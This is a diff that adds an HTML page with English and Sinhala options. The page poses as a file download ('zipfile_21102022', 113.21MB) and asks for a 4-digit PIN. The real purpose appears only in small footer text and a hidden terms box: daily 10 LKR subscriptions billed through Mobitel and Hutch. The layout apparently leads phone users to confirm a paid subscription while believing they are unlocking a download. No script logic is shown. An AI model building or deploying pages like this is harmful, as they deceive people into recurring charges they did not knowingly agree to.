@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="format-detection" content="telephone=no" />
+  <title>PIN Verification</title>
+  <link rel="icon" href="data:," />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Sinhala:wght@400;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+  <div class="wrapper">
+    <div id="header">
+      <div class="headerwrap">
+        <div class="langbtnwrap show">
+          <a href="?lang=en" class="langbtn active" data-lang="en">English</a>
+          <a href="?lang=si" class="langbtn" data-lang="si">සිංහල</a>
+        </div>
+        <div class="clear"></div>
+      </div>
+    </div>
+
+    <div id="container">
+      <img class="pict" src="pict.svg" alt="" />
+
+      <div class="descript-wrap">
+        <div class="file_n">
+          <div class="txt blue" data-i18n="fileName">File Name</div>
+          <div class="txt grey">zipfile_21102022</div>
+        </div>
+        <div class="file_s">
+          <div class="txt blue" data-i18n="fileSize">File Size</div>
+          <div class="txt grey">113.21MB</div>
+        </div>
+        <div class="speed">
+          <div class="txt blue" data-i18n="downloadSpeed">Download speed</div>
+          <div class="txt grey">100 Mb/s</div>
+        </div>
+      </div>
+
+      <div class="contentsection">
+        <div id="pbox" class="section">
+          <form method="POST" id="pboxform" novalidate>
+            <div class="pntxt" data-i18n="pinTitle">Please enter the 4-digit PIN</div>
+            <div class="pinBox pulseflash pulseflash-delay">
+              <input type="tel" name="p" id="p" class="numeric pincheck pin-only" maxlength="4" autocomplete="off" inputmode="numeric" placeholder="****" />
+              <span class="sidebtncheck pincheckicon"><img src="icn-check.svg" alt="" /></span>
+            </div>
+            <div class="egtxt" data-i18n="pinExample">(example: 1234)</div>
+            <div class="errorBox"></div>
+            <div class="btnpin btnpn">
+              <button type="submit" class="button">
+                <div class="btntxt" data-i18n="pinBtn1">Continue</div>
+                <div class="submitload" style="display:none;"><div class="lds-dual-ring"></div></div>
+              </button>
+            </div>
+            <div class="securewrap">
+              <img src="secure.svg" alt="" />
+              <div data-i18n="pinSecure">Do not share your verification code with anyone.</div>
+            </div>
+          </form>
+        </div>
+      </div>
+
+      <img class="icon" src="icon.svg" alt="" />
+    </div>
+
+    <div id="footer">
+      <div class="serviceNote" id="opFooterNote" data-i18n-html="footerNote">ZD Jam Magic Escapes — Mobitel: 10 LKR/day. ZD X Gamez — Hutch: 10 LKR/day.</div>
+      <div class="terms" data-i18n="terms">Terms &amp; Condition</div>
+      <div class="tncbox hide">
+        <div class="tnc" data-i18n="tncText">Mobitel: 10 LKR/day (unsub: SMS C XG to 85868). Hutch: 10 LKR/day (unsub: SMS C XG to 87689).</div>
+        <div class="closetnc" data-i18n="close">Close</div>
+      </div>
+      <div class="copyright" data-i18n-html="copyright">&copy;&nbsp;2026&nbsp;&nbsp;All Rights Reserved</div>
+    </div>
+  </div>
+  <script src="script.js"></script>
+</body>
+</html>
